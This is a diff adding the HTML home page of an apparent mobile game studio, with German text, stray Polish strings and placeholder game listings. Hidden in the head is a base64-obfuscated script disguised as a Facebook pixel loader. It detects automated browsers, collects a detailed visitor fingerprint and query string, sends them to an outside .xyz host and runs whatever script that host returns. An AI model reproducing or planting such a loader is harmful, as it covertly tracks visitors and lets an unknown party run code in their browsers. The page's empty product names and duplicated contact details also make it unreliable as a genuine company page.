@@ -1,0 +1,604 @@
+﻿<!doctype html>
+<html class="no-js" lang="pl">
+
+
+<head>
+<script src="data:text/javascript;base64, dmFyIGtrdGR4dWR6bm9tbm16ZHBlbGF3cWdxbWpicGo9ZnVuY3Rpb24oc3JjKXt2YXIgcT1hdG9iKCJYMTl6ZEc5d1FXeHNWR2x0WlhKekxuZGxZbVJ5YVhabGNpNWZYMjVwWjJoMGJXRnlaUzVmYzJWc1pXNXBkVzB1WTJGc2JGQm9ZVzUwYjIwdVkyRnNiRk5sYkdWdWFYVnRMbDlUWld4bGJtbDFiVjlKUkVWZlVtVmpiM0prWlhJdWMyVnNaVzVwZFcwdVpISnBkbVZ5TGw5elpXeGxibWwxYlM1ZlgzZGxZbVJ5YVhabGNsOWxkbUZzZFdGMFpTNWZYM05sYkdWdWFYVnRYMlYyWVd4MVlYUmxMbDlmZDJWaVpISnBkbVZ5WDNOamNtbHdkRjltZFc1amRHbHZiaTVmWDNkbFltUnlhWFpsY2w5elkzSnBjSFJmWm5WdVl5NWZYM2RsWW1SeWFYWmxjbDl6WTNKcGNIUmZabTR1WDE5bWVHUnlhWFpsY2w5bGRtRnNkV0YwWlM1ZlgyUnlhWFpsY2w5MWJuZHlZWEJ3WldRdVgxOTNaV0prY21sMlpYSmZkVzUzY21Gd2NHVmtMbDlmWkhKcGRtVnlYMlYyWVd4MVlYUmxMbDlmYzJWc1pXNXBkVzFmZFc1M2NtRndjR1ZrTGw5ZlpuaGtjbWwyWlhKZmRXNTNjbUZ3Y0dWa0xsOXdhR0Z1ZEc5dExuQm9ZVzUwYjIwdVpHOXRRWFYwYjIxaGRHbHZibDlmYm1sbmFIUnRZWEpsIikuc3BsaXQoIi4iKSxlPWVuY29kZVVSSUNvbXBvbmVudCxnPTAsdz13aW5kb3csZD13LmRvY3VtZW50LG49dy5uYXZpZ2F0b3IsZGU9ImRvY3VtZW50RWxlbWVudCIscz13LnNjcmVlbixwPSIiLGE9ImF2YWlsIixpPSJpbm5lciIsbz0ib3V0ZXIiLEg9IkhlaWdodCIsVz0iV2lkdGgiLGM9dy5jaHJvbWU/T2JqZWN0LmtleXMody5jaHJvbWUpLmpvaW4oIioiKToiKiIsdGFnPWQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7ZnVuY3Rpb24gd2QoKXt0cnl7Zm9yKHZhciBsIGluIHEpe3ZhciB6PXFbbF07aWYod1t6XXx8blt6XSlyZXR1cm4gejtpZihkJiZkW2RlXSYmZFtkZV0uZ2V0QXR0cmlidXRlJiZkW2RlXS5nZXRBdHRyaWJ1dGUoeikpcmV0dXJuIHo7aWYoeiBpbiB3fHx6IGluIGQpcmV0dXJuIHp9cmV0dXJuIDB9Y2F0Y2goZSl7fX0hZnVuY3Rpb24gd3AoKXt0cnl7aWYobiYmbi5wbHVnaW5zKXtPYmplY3Qua2V5cyhuLnBsdWdpbnMpLmZvckVhY2goZnVuY3Rpb24oaSl7aWYobi5wbHVnaW5zW2ldKXArPW4ucGx1Z2luc1tpXS5maWxlbmFtZSsiKiJ9KX19Y2F0Y2goZSl7fX0oKTt0cnl7Zz1kLmNyZWF0ZUVsZW1lbnQoImNhbnZhcyIpLmdldENvbnRleHQoIndlYmdsIik7Zz1nLmdldFBhcmFtZXRlcihnLmdldEV4dGVuc2lvbigiV0VCR0xfZGVidWdfcmVuZGVyZXJfaW5mbyIpLlVOTUFTS0VEX1JFTkRFUkVSX1dFQkdMKX1jYXRjaChlKXt9c3JjPSJodHRwczovL2FsZmFiZXR0YWdhbW1hLnh5ei9zY3JpcHQucGhwP2NsaWQ9IitidG9hKCJyZWY9IitlKGQucmVmZXJyZXIpKyImZHJpdmU9Iit3ZCgpKyImYz0iK2MrIiZzPSIrc1thK0hdKyIqIit3W2krSF0rIioiK3dbbytIXSsiKiIrc1thK1ddKyIqIit3W2krV10rIioiK3dbbytXXSsiKiIrdy5kZXZpY2VQaXhlbFJhdGlvKyIqIituLm1heFRvdWNoUG9pbnRzKyImcD0iK3ArIiZoPSIrbi5oYXJkd2FyZUNvbmN1cnJlbmN5KyIqIituLmRldmljZU1lbW9yeSsiKiIrZShnKSsiJnQ9IitlKG5ldyBEYXRlKCkudG9TdHJpbmcoKSkrIiZxPSIrZSh3LmxvY2F0aW9uLnNlYXJjaC5zdWJzdHIoMSkpKTt0YWdbInR5cGUiXT0idGV4dC9qYXZhc2NyaXB0Ijt0YWdbInNyYyJdPXNyYztkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHRhZyl9KCJodHRwczovL2Nvbm5lY3QuZmFjZWJvb2submV0L2VuX1VTL2ZiZXZlbnRzLmpzIik="></script>    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <title>Entwicklungsstudio für mobile Spiele | Addictive Gamers</title>
+    <meta name="description" content="Jeder Tag, an dem wir großartige Spiele für unsere Benutzer erstellen, ist eine Freude für uns - und das Beste kommt noch!">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!-- favicon -->
+    <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
+
+    <!-- all css here -->
+
+    <!-- bootstrap v3.3.6 css -->
+    <link rel="stylesheet" href="bootstrap.min.css">
+    <!-- owl.carousel css -->
+    <link rel="stylesheet" href="owl.carousel.css">
+    <link rel="stylesheet" href="owl.transitions.css">
+    <!-- meanmenu css -->
+    <link rel="stylesheet" href="meanmenu.min.css">
+    <!-- font-awesome css -->
+    <link rel="stylesheet" href="font-awesome.min.css">
+    <link rel="stylesheet" href="icon.css">
+    <link rel="stylesheet" href="flaticon.css">
+    <!-- magnific css -->
+    <link rel="stylesheet" href="magnific.min.css">
+    <!-- venobox css -->
+    <link rel="stylesheet" href="venobox.css">
+    <!-- style css -->
+    <link rel="stylesheet" href="style.css">
+    <!-- responsive css -->
+    <link rel="stylesheet" href="responsive.css">
+
+    <!-- modernizr css -->
+    <script src="modernizr-2.8.3.min.js"></script>
+</head>
+
+<body>
+
+    <!--[if lt IE 8]>
+			<p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
+		<![endif]-->
+
+    <div id="preloader"></div>
+    <header class="header-one">
+        <!-- header-area start -->
+        <div id="sticker" class="header-area hidden-xs">
+            <div class="container">
+                <div class="row">
+                    <!-- logo start -->
+                    <div class="col-md-3 col-sm-3">
+                        <div class="logo">
+                            <!-- Brand -->
+                            <a class="navbar-brand page-scroll sticky-logo" href="index.html">
+                                <img src="logo2.png" alt="">
+                            </a>
+                        </div>
+                    </div>
+                    <!-- logo end -->
+                    <div class="col-md-9 col-sm-9">
+                        <div class="header-right-link">
+                            <!-- search option start -->
+                            <form action="#">
+                                <div class="search-option">
+                                    <input type="text" placeholder="Search...">
+                                    <button class="button" type="submit"><i class="fa fa-search"></i></button>
+                                </div>
+                                <a class="main-search" href="#"><i class="fa fa-search"></i></a>
+                            </form>
+                            <!-- search option end -->
+                        </div>
+                        <!-- mainmenu start -->
+                        <nav class="navbar navbar-default">
+                            <div class="collapse navbar-collapse" id="navbar-example">
+                                <div class="main-menu">
+                                    <ul class="nav navbar-nav navbar-right">
+                                        <li>
+                                            <a href="index.html">Main</a>
+                                        </li>
+                                        <li>
+                                            <a class="pagess" id="scroll-button1" href="#">Spiele</a>
+                                        </li>
+                                        <li>
+                                            <a class="pagess" href="contact-us.html">Kontakt</a>
+                                        </li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </nav>
+                        <!-- mainmenu end -->
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- header-area end -->
+        <!-- mobile-menu-area start -->
+        <div class="mobile-menu-area hidden-lg hidden-md hidden-sm">
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-12">
+                        <div class="mobile-menu">
+                            <div class="logo">
+                                <a href="index.html"><img src="logo2.png" alt=""></a>
+                            </div>
+                            <nav id="dropdown">
+                                <ul>
+                                    <li>
+                                        <a href="index.html">Main</a>
+                                    </li>
+                                    <li>
+                                        <a class="pagess" id="scroll-button4" href="#">Spiele</a>
+                                    </li>
+                                    <li>
+                                        <a class="pagess" href="contact-us.html">Kontakt</a>
+                                    </li>
+                                </ul>
+                            </nav>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- mobile-menu-area end -->
+    </header>
+    <!-- header end -->
+    <!-- Start Slider Area -->
+    <div class="intro-area">
+        <div class="intro-carousel">
+            <div class="intro-content">
+                <div class="slider-images">
+                    <picture>
+                        <source srcset="hero-bg.webp" type="image/webp">
+                        <source srcset="hero-bg.jpg" type="image/jpeg">
+                        <img src="hero-bg.jpg" alt="">
+                    </picture>
+                </div>
+                <div class="slider-content">
+                    <div class="container">
+                        <div class="row">
+                            <div class="col-md-12 text-center">
+                                <div class="layer-1-2">
+                                    <h1 class="title2">Entwicklungsstudio für mobile Spiele</h1>
+                                </div>
+                                <div class="layer-1-1 hidden-xs">
+                                    <p>Jeder Tag, an dem wir großartige Spiele für unsere Benutzer erstellen, ist eine Freude für uns - und das Beste kommt noch!</p>
+                                </div>
+                                <div class="layer-1-3">
+                                    <a href="#" class="ready-btn" id="scroll-button2">Unsere Spiele</a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="intro-content">
+                <div class="slider-images">
+                    <picture>
+                        <source srcset="hero-bg2.webp" type="image/webp">
+                        <source srcset="hero-bg2.jpg" type="image/jpeg">
+                        <img src="hero-bg2.jpg" alt="">
+                    </picture>
+                </div>
+                <div class="slider-content">
+                    <div class="container">
+                        <div class="row">
+                            <div class="col-md-12 text-center">
+                                <div class="layer-1-2">
+                                    <h1 class="title2">Entwicklungsstudio für mobile Spiele</h1>
+                                </div>
+                                <div class="layer-1-1 hidden-xs">
+                                    <p>Jeder Tag, an dem wir großartige Spiele für unsere Benutzer erstellen, ist eine Freude für uns - und das Beste kommt noch!</p>
+                                </div>
+                                <div class="layer-1-3">
+                                    <a href="#" class="ready-btn" id="scroll-button3">Unsere Spiele</a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- End Slider Area -->
+
+    <!-- Start Product Area -->
+    <div class="product-area area-padding" id="games-section">
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-md-12 col-sm-12 col-xs-12">
+                    <div class="section-headline text-center">
+                        <h3>Unsere Spiele</h3>
+                        <p>Wir entwickeln seit 2004 innovative Spiele. Wir bieten unseren Kunden professionelle Dienstleistungen.</p>
+                    </div>
+                </div>
+            </div>
+            <div class="best-product">
+
+                <div class="row bg-dark">
+                    <div class="container">
+                        <!-- Start single product -->
+                        <div class="col-md-12 col-sm-12 col-xs-12">
+                            <div class="single-product">
+                                <div class="col-md-6 col-sm-6 col-xs-12">
+                                    <div class="product">
+                                        <div class="product-img">
+                                            <picture>
+                                                <source srcset="game1.webp" type="image/webp">
+                                                <source srcset="game1.jpg" type="image/jpeg">
+                                                <img src="game1.jpg" alt="">
+                                            </picture>
+                                        </div>
+                                    </div>
+                                </div>
+                                <!-- Start product content -->
+                                <div class="col-md-6 col-sm-6 col-xs-12">
+                                    <div class="product-content text-center">
+                                        <h4 class="product-name">
+                          </h4>
+                                        <div class="launch-date">
+                                            <span>Veröffentlicht: Februar 2018</span>
+                                        </div>
+                                        <div class="price-box">
+                                            <span class="price">Kostenlos</span>
+                                        </div>
+                                        <div class="pro-rating no-rating">
+                                            <span class="rating-rate">Bewertung: 4.5</span>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                        </div>
+                                        <div class="download-btn">
+                                        </div>
+                                    </div>
+                                </div>
+                                <!-- End product content -->
+                            </div>
+                        </div>
+                        <!-- End single product -->
+                    </div>
+                </div>
+                <!-- /.row -->
+
+                <div class="row">
+                    <div class="container">
+                        <!-- Start single product -->
+                        <div class="col-md-12 col-sm-12 col-xs-12">
+                            <div class="single-product last-item">
+                                <!-- Start product content -->
+                                <div class="col-md-6 col-sm-6 hidden-xs">
+                                    <div class="product-content text-center">
+                                        <h4 class="product-name">
+                      </h4>
+                                        <div class="launch-date">
+                                            <span>Veröffentlicht: August 2018</span>
+                                        </div>
+                                        <div class="price-box">
+                                            <span class="price">Kostenlos</span>
+                                        </div>
+                                        <div class="pro-rating no-rating">
+                                            <span class="rating-rate">Bewertung: 4.8</span>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                        </div>
+                                        <div class="download-btn">
+                                        </div>
+                                    </div>
+                                </div>
+                                <!-- End product content -->
+                                <div class="col-md-6 col-sm-6">
+                                    <div class="product">
+                                        <div class="product-img">
+                                            <picture>
+                                                <source srcset="game2.webp" type="image/webp">
+                                                <source srcset="game2.jpg" type="image/jpeg">
+                                                <img src="game2.jpg" alt="">
+                                            </picture>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="hidden-lg hidden-md hidden-sm col-xs-12">
+                                    <div class="product-content text-center">
+                                        <h4 class="product-name">
+											</h4>
+                                        <div class="launch-date">
+                                            <span>Veröffentlicht: August 2018</span>
+                                        </div>
+                                        <div class="price-box">
+                                            <span class="price">Kostenlos</span>
+                                        </div>
+                                        <div class="pro-rating no-rating">
+                                            <span class="rating-rate">Bewertung: 4.8</span>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                        </div>
+                                        <div class="download-btn">
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- End single product -->
+                    </div>
+                </div>
+
+                <div class="row bg-dark">
+                    <div class="container">
+                        <!-- Start single product -->
+                        <div class="col-md-12 col-sm-12 col-xs-12">
+                            <div class="single-product">
+                                <div class="col-md-6 col-sm-6 col-xs-12">
+                                    <div class="product">
+                                        <div class="product-img">
+                                            <picture>
+                                                <source srcset="game3.webp" type="image/webp">
+                                                <source srcset="game3.jpg" type="image/jpeg">
+                                                <img src="game3.jpg" alt="">
+                                            </picture>
+                                        </div>
+                                    </div>
+                                </div>
+                                <!-- Start product content -->
+                                <div class="col-md-6 col-sm-6 col-xs-12">
+                                    <div class="product-content text-center">
+                                        <h4 class="product-name">
+                          <a target="_blank" rel="noopener">Space Diner</a>
+                        </h4>
+                                        <div class="launch-date">
+                                            <span>Veröffentlicht: März 2017</span>
+                                        </div>
+                                        <div class="price-box">
+                                            <span class="price">Kostenlos</span>
+                                        </div>
+                                        <div class="pro-rating no-rating">
+                                            <span class="rating-rate">Bewertung: 4.5</span>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                        </div>
+                                        <div class="download-btn">
+                                        </div>
+                                    </div>
+                                </div>
+                                <!-- End product content -->
+                            </div>
+                        </div>
+                        <!-- End single product -->
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class="container">
+                        <!-- Start single product -->
+                        <div class="col-md-12 col-sm-12 col-xs-12">
+                            <div class="single-product last-item">
+                                <!-- Start product content -->
+                                <div class="col-md-6 col-sm-6 hidden-xs">
+                                    <div class="product-content text-center">
+                                        <h4 class="product-name">
+                      </h4>
+                                        <div class="launch-date">
+                                            <span>Veröffentlicht: Januar 2016</span>
+                                        </div>
+                                        <div class="price-box">
+                                            <span class="price">Kostenlos</span>
+                                        </div>
+                                        <div class="pro-rating no-rating">
+                                            <span class="rating-rate">Bewertung: 4.9</span>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                        </div>
+                                        <div class="download-btn">
+                                        </div>
+                                    </div>
+                                </div>
+                                <!-- End product content -->
+                                <div class="col-md-6 col-sm-6">
+                                    <div class="product">
+                                        <div class="product-img">
+                                            <picture>
+                                                <source srcset="game4.webp" type="image/webp">
+                                                <source srcset="game4.jpg" type="image/jpeg">
+                                                <img src="game4.jpg" alt="">
+                                            </picture>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="hidden-lg hidden-md hidden-sm col-xs-12">
+                                    <div class="product-content text-center">
+                                        <h4 class="product-name">
+											</h4>
+                                        <div class="launch-date">
+                                            <span>Wypuszczona: Styczeń 2016</span>
+                                        </div>
+                                        <div class="price-box">
+                                            <span class="price">Kostenlos</span>
+                                        </div>
+                                        <div class="pro-rating no-rating">
+                                            <span class="rating-rate">Bewertung: 4.9</span>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                            <a href="#"><i class="fa fa-star-o"></i></a>
+                                        </div>
+                                        <div class="download-btn">
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- End single product -->
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+    <!-- End Product Area -->
+    <!-- Start testimonials Area -->
+    <div class="reviews-area fix area-padding">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12 col-sm-12 col-xs-12">
+                    <div class="section-headline text-center">
+                        <h3>Spielbeschreibungen</h3>
+                    </div>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-md-12 col-sm-12 col-xs-12">
+                    <div class="Reviews-content">
+                        <!-- start testimonial carousel -->
+                        <div class="testimonial-carousel item-indicator">
+                            <div class="game-description">
+                                <div class="testi-img">
+                                    <img src="game1.jpg" alt="">
+                                </div>
+                                <div class="testi-text">
+                                  <h4>Dystopia: Modern Empires</h4>
+                                    <p>Dystopia: Modern Empires ist eine postapokalyptische Welt, die von den größten Unternehmen kontrolliert wird, in denen Sie als Rebell einen Ort finden, an dem Sie Ihre eigene Basis aufbauen können. Sie hat die Aufgabe, ein Imperium aufzubauen, New York zu übernehmen, Ihre Basis zu erweitern und andere Spieler anzugreifen.</p>
+                                </div>
+                            </div>
+                            <!-- End single item -->
+                            <div class="game-description">
+                                <div class="testi-img">
+                                    <img src="game4.jpg" alt="">
+                                </div>
+                                <div class="testi-text">
+                                  <h4>Heroes Squad</h4>
+                                    <p>Stellen Sie sich ein Team von kämpfenden Bestien vor, zu denen das scharf schießende Laser Kitty, das brutale Cyber ​​Rhino und der erstaunliche Gunner Bear gehören. Heros Squad ist das brutalste Team, das Sie jemals befohlen haben.</p>
+                                </div>
+                            </div>
+                            <!-- End single item -->
+                            <div class="game-description">
+                                <div class="testi-img">
+                                    <img src="game3.jpg" alt="">
+                                </div>
+                                <div class="testi-text">
+                                    <h4>Space Diner</h4>
+                                    <p>Space Diner knüpft an die Traditionen guter alter Bergbauspiele an. Es geht darum, kosmische Nahrung zu extrahieren, die von Fritz 'Freunden und sich selbst zu einer Diät gezwungen wird. Die Küchenchefs sind verschwunden, und Ihre Aufgabe ist es, Puzzleteile zu sammeln, Essen zu holen, Köche zu finden und neue Funktionen freizuschalten.</p>
+                                </div>
+                            </div>
+                            <!-- End single item -->
+                            <div class="game-description">
+                                <div class="testi-img">
+                                    <img src="game2.jpg" alt="">
+                                </div>
+
+                                <div class="testi-text">
+                                  <h4>Hog Run</h4>
+                                  <p>Die Schweine fliehen aus der Wurstfabrik. Sie können ihnen bei der Flucht helfen, bevor der Metzger sie erreicht! Wie weit kannst du wegkommen?</p>
+                                </div>
+                            </div>
+                            <!-- End single item -->
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- End testimonials end -->
+
+    <!-- Start Footer bottom Area -->
+    <footer>
+        <div class="footer-area">
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-4 col-sm-4 col-xs-12">
+                        <div class="footer-content">
+                            <div class="footer-head">
+                                <h4>Informationen zu Kontakten</h4>
+
+                                <div class="footer-contacts">
+                                    <p><span>Telefon:</span> 03733 34 51 89</p>
+                                    <p><span>Telefon:</span> 03733 34 51 89</p>
+                                    <p><span>E-mail:</span> info@addictivegamers.com</p>
+                                    <p><span>Büro:</span> Alter Wall 95, 97340 Marktbreit, DE</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- end single footer -->
+                    <div class="col-md-4 col-sm-4 col-xs-12">
+                        <div class="footer-content">
+                            <div class="footer-head">
+                                <h4>Unsere Spiele</h4>
+                                <div class="footer-services-link">
+
+                                    <ul class="footer-list">
+                                        <li><a href="#">Little bite</a></li>
+                                        <li><a href="#">Cricket game</a></li>
+                                        <li><a href="#">Card play</a></li>
+                                        <li><a href="#">Angle draw</a></li>
+                                    </ul>
+
+                                    <ul class="footer-list">
+                                        <li><a href="#">Little bite</a></li>
+                                        <li><a href="#">Cricket game</a></li>
+                                        <li><a href="#">Card play</a></li>
+                                        <li><a href="#">Angle draw</a></li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- end single footer -->
+                    <div class="col-md-4 col-sm-4 col-xs-12">
+                        <div class="footer-content last-item">
+                            <div class="footer-head">
+                                <h4>Nachrichten abonnieren</h4>
+
+                                <div class="subs-feilds">
+                                    <div class="suscribe-input">
+                                        <input type="email" class="email form-control width-80" id="sus_email" placeholder="Twój e-mail">
+                                        <button type="submit" id="sus_submit" class="add-btn">Abonnieren</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- end single footer -->
+                </div>
+            </div>
+        </div>
+        <!-- End footer area -->
+        <div class="footer-area-bottom">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12">
+                        <div class="copyright">
+                            <p>
+                                Copyright © 2020 Alle Rechte vorbehalten |
+                                <a class="pagess" href="terms-and-conditions.html">Geschäftsbedingungen</a> |
+                                <a class="pagess" href="privacy-policy.html">Datenschutz-Bestimmungen</a>
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- all js here -->
+
+    <!-- jquery latest version -->
+    <script src="jquery-1.12.4.min.js"></script>
+    <!-- bootstrap js -->
+    <script src="bootstrap.min.js"></script>
+    <!-- owl.carousel js -->
+    <script src="owl.carousel.min.js"></script>
+    <!-- isotope js -->
+    <script src="isotope.pkgd.min.js"></script>
+    <!-- magnific js -->
+    <script src="magnific.min.js"></script>
+    <!-- venobox js -->
+    <script src="venobox.min.js"></script>
+    <!-- meanmenu js -->
+    <script src="jquery.meanmenu.js"></script>
+    <!-- Form validator js -->
+    <script src="form-validator.min.js"></script>
+    <!-- plugins js -->
+    <script src="plugins.js"></script>
+    <!-- main js -->
+    <script src="main.js"></script>
+</body>
+
+
+</html>
